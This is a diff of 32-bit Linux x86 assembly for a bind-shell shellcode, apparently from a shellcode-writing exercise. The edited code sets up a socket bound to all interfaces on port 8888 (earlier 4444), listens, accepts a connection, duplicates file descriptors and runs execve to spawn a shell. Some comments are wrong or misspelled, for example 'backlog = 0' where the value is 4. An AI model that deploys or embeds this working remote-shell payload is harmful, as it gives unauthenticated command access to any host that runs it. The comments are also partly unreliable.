@@ -40,50 +40,45 @@ _start:
 	; store sockfd into esi
 
 	xchg esi, eax	; sockfd now stored into esi (0x3)
-
+	
 	;
-	; bind to socket
-	; bind(sockfd, 
-	; sa_family=AF_INET, 
-	; sin_port=htons(8080),
-	; sin_addr=inet_addr("0.0.0.0")},
-	; 16)
+	;bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
 	;
+		
+	mov al,0x66 		; socketcal;() syscall #
 
-	mov al, 0x66		; socketcall() syscall #
+	pop ebx 		; take the 2 from the stack to use as bind
 
-	inc ebx			; ebx was 0x1, now 0x2 it's for bind() syscall #
+	xor edx, edx 		; clear edx to store 0x0 for INADDR_ANY
+	push edx 		; INADDR_ANY
+	push word 0xb822 	; port = 8888
+	push word bx 		; AF_INET = 2
 
-	push edx		; INADDR_ANY (0.0.0.0)
-	push word 0x5C11	; port = 4444
-	push word bx		; AF_INET = 2
+	mov ecx, esp 		; save pointer in ecx -- points to struct
 
-	mov ecx, esp		; save pointer in ecx -- points to struct
+	push 0x10 		; sizeof = 16
+	push ecx 		; struck sockaddr pointer
+	push esi 		; sockfd / 0x3
+	
+	mov ecx, esp 		; save pointer in ecx -- points to bind() args
+	
+	int 0x80 		; run bind()
 
-	push 0x10		; sizeof
-	push ecx		; pointer
-	push esi		; sockfd / 0x3
-
-	mov ecx, esp		; save pointer in ecx -- points to bind() args
-
-	int 0x80		; run bind()
-
-	;
-	; listen for connections
+	;	 
+	; listen fo connections
 	; listen(sockfd, 2)
 	;
+
+	mov al,0x66 	; socketcall() syscall #
 	
-	mov al, 0x66		; socketcall() syscall #
-	
-	push ebx		; queueLimit = 2 -- 0x2 from before
-	push esi		; sockfd / 0x3
+	mov bl, 0x4
 
-	mov ecx, esp		; save pointer in ecx -- points to listen() args
+	push ebx 	; backlog = 0
+	push esi 	; sockfd / 0x3
 
-	inc ebx			; add 2 to ebx to equal 0x4 for listen() syscall #
-	inc ebx			; ebx = 0x4
+	mov ecx,esp 	; save pointer in ecx -- points to listen() args
 
-	int 0x80		; run listen()
+	int 0x80 	; run listen()
 
 	;
 	; accept incoming connections
@@ -137,8 +132,8 @@ duploop:
 	mov ecx, esp		; save pointer
 	
 	push eax		; NULL
-	mov edx, esp
+	mov edx, esp		; save pointer in ecx -- points to execve() args
 	
 	mov al, 0xb		; execve() syscall #   
 	
-    	int 0x80		; run execve() GET DAT SHELL BOI
+    	int 0x80		; run execve()
